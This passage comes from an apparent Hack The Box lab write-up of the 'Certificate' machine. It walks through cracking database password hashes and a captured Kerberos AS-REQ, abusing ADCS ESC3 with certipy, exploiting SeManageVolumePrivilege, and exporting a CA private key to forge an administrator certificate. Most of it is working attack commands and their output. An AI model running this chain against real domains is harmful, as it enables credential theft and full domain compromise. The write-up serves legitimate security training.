I'll dump password hashes from the users table to crack.

```
MariaDB [certificate_webapp_db]> select username, password, role from users \G;
*************************** 1. row ***************************
username: Lorra.AAA
password: $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
    role: teacher
*************************** 2. row ***************************
username: Sara1200
password: $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
    role: teacher
*************************** 3. row ***************************
username: Johney
password: $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
    role: student
*************************** 4. row ***************************
username: havokww
password: $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
    role: teacher
*************************** 5. row ***************************
username: stev
password: $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
    role: student
*************************** 6. row ***************************
username: sara.b
password: $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
    role: admin
*************************** 7. row ***************************
username: benkyou
password: $2y$04$RcfMH2mdb6yUXwzaKfTgpuX5ieE5TojKREKEYvOnEFB2ws5s8maF2
    role: student
7 rows in set (0.177 sec)
```

sara.b's hash cracks to Blink182, this gives us our first domain user credentials.

```
hashcat -m 3200 mysql.hashes /usr/share/wordlists/rockyou.txt
...[SNIP]...
$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
```

## User as Lion.SK

I'll start by running a BloodHound ingestor to map out the domain.

```
bloodhound-python --username sara.b --password Blink182 -c All -d certificate.htb -dc DC01.certificate.htb -ns 10.129.249.89 --zip --dns-timeout 30
```

sara.b is a member of the Help Desk group, and members of this group are enrolled in the Remote Management and Remote Desktop group. 
![alt text](/assets/img/2025-10-05-htb-certificate/sara-rm.png)

### Cracking AS REQ from pcap

There's a pcap file in sara.b's Documents directory. I'll download it over to my host and view it in Wireshark.

```
*Evil-WinRM* PS C:\Users\Sara.B\Documents> gci WS-01

    Directory: C:\Users\Sara.B\Documents\WS-01

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
```

The captured traffic contains some SMB traffic where the user was trying to authenticate as administrator, but those all failed so we can ignore.
What's of interest to us is the captured Kerberos authentication requests, specifically the pre-authentication request.

![alt text](/assets/img/2025-10-05-htb-certificate/pcap.png)

I've shown extracting the fields from Wireshark to crack the AS-REQ request on my blog before, so I won't go through it manually.
There's this [tool](https://github.com/jalvarezz13/Krb5RoastParser) that can do the heavylifting for us, and parse the packets nicely for us for cracking.

```
python3 krb5_roast_parser.py ../WS-01_PktMon.pcap as_req
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

We're able to crack the AS REQ and obtain Lion.SK's password.

```
hashcat -m 19900 asreq.txt /usr/share/wordlists/rockyou.txt                                                  
...[SNIP]...
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
```

## User as ryan.k

### ESC3 to enroll certificate as another user

Lion.SK is a member of the Domain CRA Managers group and members of this group can issue and revoke certificates for domain users. Essentially, this means that members of this group are Enrollment Agents and are authorised to request certificates on behalf of other users.

![alt text](/assets/img/2025-10-05-htb-certificate/lion-sk.png)

I'll check for certificates that Lion.SK can enroll for using certipy.

```
certipy find \
        -u Lion.SK@certificate.htb -p '!QAZ2wsx' \
        -dc-ip 10.129.249.89 -text \
        -enabled -vulnerable -stdout

Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

certipy finds a template that is vulnerable to ESC3.
This is because the Delegated-CRA template can be used to issue Enrollment Agent certificates, which is the first prerequisite for ESC3.
Next, we need to find a target certificate template that allows agent enrollment.

```
# find target template
certipy find \
        -u Lion.SK@certificate.htb -p '!QAZ2wsx' \
        -dc-ip 10.129.249.89 -text \
        -enabled -stdout
...[SNIP]...
  1                                                                                                                                                                                                      
    Template Name                       : SignedUser                                                                                                                                                     
    Display Name                        : Signed User                                                                                                                                                    
    Certificate Authorities             : Certificate-LTD-CA                                                                                                                                             
    Enabled                             : True                                                                                                                                                           
    Client Authentication               : True                                                                                                                                                           
    Enrollment Agent                    : False                                                                                                                                                          
    Any Purpose                         : False                                                                                                                                                          
    Enrollee Supplies Subject           : False                                                                                                                                                          
    Certificate Name Flag               : SubjectAltRequireUpn                                                                                                                                           
                                          SubjectAltRequireEmail                                                                                                                                         
                                          SubjectRequireEmail                                                                                                                                            
                                          SubjectRequireDirectoryPath                                                                                                                                    
    Enrollment Flag                     : IncludeSymmetricAlgorithms                                                                                                                                     
                                          PublishToDs                                                                                                                                                    
                                          AutoEnrollment                                                                                                                                                 
    Private Key Flag                    : ExportableKey                                                                                                                                                  
    Extended Key Usage                  : Client Authentication                                                                                                                                          
                                          Secure Email                                                                                                                                                   
                                          Encrypting File System                                                                                                                                         
    Requires Manager Approval           : False                                                                                                                                                          
    Requires Key Archival               : False                                                                                                                                                          
    RA Application Policies             : Certificate Request Agent                                                                                                                                      
    Authorized Signatures Required      : 1                                                                                                                                                              
    Schema Version                      : 2                                                                                                                                                              
    Validity Period                     : 10 years                                                                                                                                                       
    Renewal Period                      : 6 weeks                                                                                                                                                        
    Minimum RSA Key Length              : 2048                                                                                                                                                           
    Template Created                    : 2024-11-03T23:51:13+00:00                                                                                                                                      
    Template Last Modified              : 2024-11-03T23:51:14+00:00                                                                                                                                      
    Permissions                                                                                                                                                                                          
      Enrollment Permissions                                                                                                                                                                             
        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins                                                                                                                                  
                                          CERTIFICATE.HTB\Domain Users                                                                                                                                   
                                          CERTIFICATE.HTB\Enterprise Admins                                                                                                                              
      Object Control Permissions                                                                                                                                                                         
        Owner                           : CERTIFICATE.HTB\Administrator                                                                                                                                  
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins                                                                                                                                  
                                          CERTIFICATE.HTB\Enterprise Admins                                                                                                                              
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins                                                                                                                                  
                                          CERTIFICATE.HTB\Enterprise Admins                                                                                                                              
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins                                                                                                                                  
                                          CERTIFICATE.HTB\Enterprise Admins                                                                                                                              
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins                                                                                                                                  
                                          CERTIFICATE.HTB\Domain Users                                                                                                                                   
                                          CERTIFICATE.HTB\Enterprise Admins                                                                                                                              
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users                                                                                                                                   
    [*] Remarks                                                                                                                                                                                          
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with
 the Certificate Request Agent application policy.                                                                                                                                                       
```

certipy is able to find multiple target certificates for us (I chose SignedUser) as they have the Client Authentication EKU set.
We now have the prerequisites for ESC3 and can request a certificate on behalf on another user to escalate privileges.

Obtain the Enrollment Agent certificate.

```shell
certipy req \
    -u Lion.SK@certificate.htb -p '!QAZ2wsx' \
    -dc-ip 10.129.249.89 -target 'DC01.certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
```

Use the Enrollment Agent certificate to request a certificate on behalf of another user.
I first tried to request a certificate on behalf of the domain administrator, but this doesn't work because the subject email is missing.

```shell
certipy req \
    -u Lion.SK@certificate.htb -p '!QAZ2wsx' \
    -dc-ip 10.129.249.89 -target 'DC01.certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\Administrator'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 23
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
```

To confirm this, we can query the domain user object and notice that the mail property isn't set, this is why it's failing.

```shell
╭─LDAPS─[DC01.certificate.htb]─[CERTIFICATE\Lion.SK]-[NS:10.129.249.89]
╰─PV ❯ Get-DomainUser -Identity Administrator -Properties mail
```

Instead, we can get a list of target users by querying for user objects that have the mail property set.

```shell
╭─LDAPS─[DC01.certificate.htb]─[CERTIFICATE\Lion.SK]-[NS:10.129.249.89]
╰─PV ❯ Get-DomainUser -Properties mail                        
mail     : saad.m@certificate.htb
mail     : alex.d@certificate.htb
mail     : ryan.k@certificate.htb
mail     : eva.f@certificate.htb
mail     : lion.sk@certificate.htb
mail     : maya.k@certificate.htb
mail     : nya.s@certificate.htb
mail     : aya.w@certificate.htb
mail     : john.c@certificate.htb
mail     : sara.b@certificate.htb
mail     : kai.x@certificate.htb
```

Out of all these users, ryan.k stands out because he is part of the Domain Storage Managers security group, and this group has special permissions related to volume maintenance.

![alt text](/assets/img/2025-10-05-htb-certificate/ryank.png)

We request a certificate on behalf of ryan.k and authenticate using their certificate to get their NT hash.

```shell
certipy req \
    -u Lion.SK@certificate.htb -p '!QAZ2wsx' \
    -dc-ip 10.129.249.89 -target 'DC01.certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx
```

Authenticate using ryan.k's certificate.

```shell
certipy auth -pfx ryan.k.pfx -dc-ip 10.129.249.89
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

## Shell as Administrator

### Exploiting SeManageVolumePrivilege to gain full access over C:\
We discover that Domain Storage Managers are granted the SeManageVolumePrivilege token, allowing them to perform volume maintenance tasks.

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

You can treat this privilege as having administrative privileges, it basically gives you full read/write access over the file system to escalate privileges.
[Microsoft](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks) also documented how this permission can be exploited if a user account having this permission is compromised.

> A user who is assigned the Perform volume maintenance tasks user right could delete a volume, which could result in the loss of data or a denial-of- service condition. Also, disk maintenance tasks can be used to modify data on the disk, such as user rights assignments that might lead to escalation of privileges.

Exploiting SeManageVolumePrivilege isn't very well-documented online, but there's this [tweet](https://x.com/0gtweet/status/1303427935647531018) by @0gtweet that goes over how you can exploit it.
I used the exploit code from [here](https://github.com/CsEnox/SeManageVolumeExploit/).

Running the exploit gives us full control over the C:\ drive but we can't directly read the root flag (*I'm not exactly sure why*) even with full permissions.

```
root.txt CERTIFICATE\Administrator:(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Users:(I)(F)
         CERTIFICATE\Administrator:(I)(F)
...
Access to the path 'C:\users\administrator\desktop\root.txt' is denied.
```

In 0gtweet's post, they overwrote utilman.exe to escalate privileges, and it is also possible to get a root shell using [this old trick](https://www.technibble.com/bypass-windows-logons-utilman/).
However, this isn't applicable here because we don't have a graphical session as RDP is not available.

Another way we could get a root shell is by overwriting `C:\Windows\System32\wbem\tzres.dll` with our own DLL and triggering it using systeminfo.
However, this also doesn't work because none of the users that we comproimsed can run the systeminfo command, so we have no way of triggering it.
Furthermore, because Defender is enabled on the machine, we will also need an AV bypass for it to succeed.
There are also other DLLs documented [here](https://unit42.paloaltonetworks.com/dll-hijacking-techniques/) that we can target like `oci.dll` but most of these techniques require us to already have administrative privileges to restart services on the server to trigger.

### Exploiting SeManageVolumePrivilege to forge certificates

The privilege escalation step here is specific to ADCS environments.
Issued certificates are stored in `C:\Windows\System32\Certlog` as *.edb files and normally these files are protected.
With the SeManageVolumeExploit we gain full control over these files, but as mentioned before, have no way of directly reading or copying those files.

Kudos to @whymir for discovering that after using the SeManageVolumeExploit, it's possible to export the CA's private key from the certificate stores using certutil.
With the CA's private key, we can use it to forge certificates for any user in the domain, similar to a Golden Ticket attack!

We first list the certificate stores on the machine using certutil.

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -Store My
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset
```

Then, because we have full permissions, we can export the CA's private key and download it over to our host.

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX CA out.pfx
MY "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file out.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

Finally, we can use certipy to forge a certificate for the administrator user, and escalate privileges to domain admin.

```shell
certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx
```

```shell
certipy auth -pfx administrator_forged.pfx -dc-ip 10.129.249.89
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```
